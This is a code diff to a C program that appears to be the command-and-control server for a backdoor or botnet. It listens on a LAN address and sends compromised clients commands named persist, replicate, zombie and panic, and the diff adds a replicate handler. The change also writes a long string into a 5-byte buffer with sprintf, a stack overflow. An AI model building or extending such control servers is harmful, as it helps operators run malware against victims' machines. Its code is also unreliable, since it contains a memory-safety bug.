@@ -17,7 +17,7 @@
 #define CYN "\e[0;36m"
 #define WHT "\e[0;37m"
 
-int PORT = 50005;
+int PORT = 8888;
 
 void printbanner(){
 	printf(MAG);
@@ -65,7 +65,9 @@ void printerr(char* s){
 int main(){
 	printbanner();
 	printsuc("Welcome to EP server console. Use q to quit\n");
-	printsuc("Starting Server..(Port:50005)\n");
+	char str[5];
+	sprintf(str, "%s%d%s", "Starting Server..(Port:",PORT,")\n");
+	printsuc(str);
 	int sock, client_socket;
 	char buffer[1024];
 	char response[18384];
@@ -81,8 +83,9 @@ int main(){
 	}
 
 	server_address.sin_family = AF_INET;
-	server_address.sin_addr.s_addr = inet_addr("192.168.174.129");//Server address
-	server_address.sin_port = htons(50005);
+	server_address.sin_addr.s_addr = inet_addr("192.168.1.49");//Server address
+	
+	server_address.sin_port = htons(PORT);
 
 	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
 	listen(sock, 5);
@@ -116,6 +119,15 @@ int main(){
 		else if (strncmp("panic",buffer,5)==0){
 			recv(client_socket, response, sizeof(response), 0);
 			printsuc(response);
+		}
+		else if (strncmp("replicate",buffer,9)==0){
+			recv(client_socket, response, sizeof(response), 0);
+			printsuc(response);
+			recv(client_socket, response, sizeof(response), 0);
+			printsuc(response);
+		}
+		else if (strncmp("h",buffer,4)==0){
+			printsuc("Commands: q, persist, replicate, zombie, panic\n");
 		}
 		else{
 			recv(client_socket, response, sizeof(response), MSG_WAITALL);
